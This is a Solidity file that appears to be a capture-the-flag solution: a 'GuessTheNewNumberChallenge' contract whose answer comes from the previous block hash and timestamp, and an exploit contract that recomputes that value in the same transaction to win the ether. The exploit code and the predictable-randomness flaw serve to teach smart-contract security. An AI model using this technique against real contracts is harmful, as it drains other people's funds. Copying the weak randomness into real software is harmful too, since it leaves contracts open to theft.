// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract GuessTheNewNumberExploit {
    GuessTheNewNumberChallenge public challengeContract;

    function GuessTheNewNumberExploit(address challengeAddress) public payable {
        challengeContract = GuessTheNewNumberChallenge(challengeAddress);
    }

    function exploit() public payable {
        require(msg.value == 1 ether);
        uint8 secretNumber = uint8(
            keccak256(block.blockhash(block.number - 1), now)
        );

        // Call guess() function on the challenge contract with the secret number and send 1 Ether
        challengeContract.guess.value(1 ether)(secretNumber);

        // Transfer the remaining balance back to the sender
        msg.sender.transfer(address(this).balance);
    }

    // Fallback function to receive Ether
    function() public payable {}
}
